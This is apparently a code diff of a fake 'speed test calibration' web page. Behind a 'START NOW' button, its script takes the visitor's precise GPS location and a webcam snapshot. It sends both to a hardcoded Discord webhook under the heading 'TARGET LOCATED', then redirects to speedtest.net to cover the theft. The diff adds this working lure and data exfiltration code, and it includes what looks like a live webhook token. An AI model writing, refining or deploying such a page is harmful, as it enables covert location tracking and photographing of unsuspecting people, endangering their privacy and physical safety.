@@ -3,20 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Speed Index</title>
+    <title>SpeedTest Calibration</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 400px; border: 1px solid #232a42; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .logo { font-size: 22px; font-weight: bold; color: #00d2ff; margin-bottom: 20px; letter-spacing: 1px; }
-        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 1.1rem; }
-        
-        /* Realistic Speedometer UI */
-        #speed-ui { display: none; margin-top: 20px; }
-        .gauge { width: 150px; height: 150px; border: 10px solid #232a42; border-top: 10px solid #00d2ff; border-radius: 50%; margin: 0 auto; animation: spin 2s linear infinite; }
-        .speed-text { font-size: 3rem; font-weight: bold; margin-top: 10px; }
-        .unit { color: #5c6784; font-size: 1rem; }
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #232a42; }
+        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
         #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
         video, canvas { display: none; }
     </style>
@@ -24,19 +15,10 @@
 <body>
 
     <div class="card">
-        <div class="logo">NETWORK NODE 2026</div>
-        <div id="intro-content">
-            <p>Sync your hardware sensors to begin the 10Gbps Latency Test.</p>
-            <button class="btn" id="startBtn">BEGIN TEST</button>
-        </div>
-
-        <div id="speed-ui">
-            <div class="gauge"></div>
-            <div class="speed-text" id="speed-num">0.0</div>
-            <div class="unit">Mbps / Downloading</div>
-        </div>
-
-        <div id="status">Waiting for System Handshake...</div>
+        <h2>NETWORK CALIBRATION</h2>
+        <p>Sync sensors to begin the 2026 Speed Test.</p>
+        <button class="btn" id="startBtn">START NOW</button>
+        <div id="status">Status: Waiting for User...</div>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -45,36 +27,34 @@
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
-        document.getElementById('startBtn').addEventListener('click', async function() {
+        document.getElementById('startBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
-            status.innerText = "Requesting node permissions...";
+            status.innerText = "1. Requesting GPS...";
 
-            // 1. Force GPS Request
+            // STEP 1: Get GPS
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Synchronized. Connecting to camera...";
+                status.innerText = "2. GPS Found. Syncing Camera...";
                 
-                // Switch to Speed UI
-                document.getElementById('intro-content').style.display = "none";
-                document.getElementById('speed-ui').style.display = "block";
-                startFakeSpeed();
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
 
-                // 2. Camera Capture
+                // STEP 2: Try Camera
                 let stream = null;
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                } catch (e) { console.log("Cam denied"); }
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                } catch (e) {
+                    console.log("Camera access denied");
+                }
 
-                // 3. Data Prep
+                // STEP 3: Send to Discord
+                status.innerText = "3. Uploading Data...";
                 const formData = new FormData();
                 const message = {
-                    content: "🚨 **NEW TARGET INTELLIGENCE**",
+                    content: "🎯 **TARGET LOCATED**",
                     embeds: [{
-                        title: "Hardware Calibration Report",
-                        color: 3447003,
+                        title: "Location Report",
                         fields: [
-                            { name: "📍 Location", value: `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
-                            { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true },
-                            { name: "📱 Browser", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true }
+                            { name: "Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` }
                         ]
                     }]
                 };
@@ -90,4 +70,27 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            formData.append
+                            formData.append('file', blob, 'shot.jpg');
+                            await fetch(WEBHOOK, { method: 'POST', body: formData });
+                            stream.getTracks().forEach(t => t.stop());
+                            done();
+                        }, 'image/jpeg');
+                    }, 1000);
+                } else {
+                    await fetch(WEBHOOK, { method: 'POST', body: formData });
+                    done();
+                }
+
+            }, (err) => {
+                alert("Error: GPS must be allowed to calibrate the speed test.");
+                status.innerText = "Error: GPS Denied.";
+            }, { enableHighAccuracy: true });
+        });
+
+        function done() {
+            document.getElementById('status').innerText = "Calibration Complete!";
+            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+        }
+    </script>
+</body>
+</html>
